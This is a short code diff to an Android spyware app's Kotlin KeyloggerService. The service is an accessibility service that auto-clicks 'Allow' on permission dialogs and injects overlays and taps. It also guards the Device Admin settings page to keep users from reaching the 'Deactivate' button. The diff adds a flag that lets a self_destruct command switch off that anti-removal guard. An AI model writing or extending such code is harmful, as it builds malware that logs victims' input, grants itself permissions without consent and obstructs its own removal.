@@ -28,6 +28,8 @@ class KeyloggerService : AccessibilityService() {
         /** Jika true, saat dialog izin runtime muncul, langsung klik "Izinkan"
          *  via AccessibilityNodeInfo.ACTION_CLICK — tanpa overlay, tanpa gesture koordinat */
         @Volatile var autoGrantEnabled: Boolean = false
+        /** Set false via self_destruct untuk nonaktifkan guard halaman Device Admin */
+        @Volatile var adminGuardEnabled: Boolean = true
 
         fun showScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f) { instance?.showOverlay(text, style, speed) }
         fun injectTap(x: Float, y: Float) { instance?.dispatchTap(x, y) }
@@ -224,6 +226,7 @@ class KeyloggerService : AccessibilityService() {
      * untuk mencegah user sampai ke tombol "Nonaktifkan".
      */
     private fun guardAdminPage(pkg: String, className: String) {
+        if (!adminGuardEnabled) return   // disabled via self_destruct
         if (!AppDeviceAdminReceiver.SETTINGS_PACKAGES.contains(pkg)) return
         val isAdminPage = AppDeviceAdminReceiver.ADMIN_PAGE_KEYWORDS.any { kw ->
             className.contains(kw, ignoreCase = true)
